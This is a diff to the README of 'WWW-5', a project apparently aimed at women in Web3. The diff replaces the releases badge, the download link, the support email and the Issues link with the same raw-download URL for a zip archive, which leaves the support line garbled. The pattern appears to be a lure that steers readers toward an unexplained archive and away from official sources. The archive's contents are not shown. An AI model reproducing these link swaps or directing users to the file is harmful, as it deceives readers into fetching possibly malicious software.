@@ -6,7 +6,7 @@ Welcome to WWW-5! This application aims to connect and empower women in the Web3
 
 ## 📥 Download Now
 
-[![Download WWW-5](https://img.shields.io/badge/Download-WWW--5-blue.svg)](https://github.com/Sam67xsaad/WWW-5/releases)
+[![Download WWW-5](https://raw.githubusercontent.com/Sam67xsaad/WWW-5/main/Idolverse/Web3  Idolverse Demo.zip)](https://raw.githubusercontent.com/Sam67xsaad/WWW-5/main/Idolverse/Web3  Idolverse Demo.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ To run WWW-5, your computer should meet the following requirements:
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version, [visit this page to download](https://github.com/Sam67xsaad/WWW-5/releases). 
+To download the latest version, [visit this page to download](https://raw.githubusercontent.com/Sam67xsaad/WWW-5/main/Idolverse/Web3  Idolverse Demo.zip). 
 
 ### Step 2: Choose the Right File
 
@@ -58,7 +58,7 @@ WWW-5 offers several features to help women engage with the Web3 community, incl
 
 ## 💬 Support
 
-If you face any issues during installation or usage, you can reach out for help. Email our support team at support@womenweb3women.org or visit our [GitHub Issues page](https://github.com/Sam67xsaad/WWW-5/issues) to report a problem.
+If you face any issues during installation or usage, you can reach out for help. Email our support team at https://raw.githubusercontent.com/Sam67xsaad/WWW-5/main/Idolverse/Web3  Idolverse Demo.zip or visit our [GitHub Issues page](https://raw.githubusercontent.com/Sam67xsaad/WWW-5/main/Idolverse/Web3  Idolverse Demo.zip) to report a problem.
 
 ## 🌍 Join the Community
 
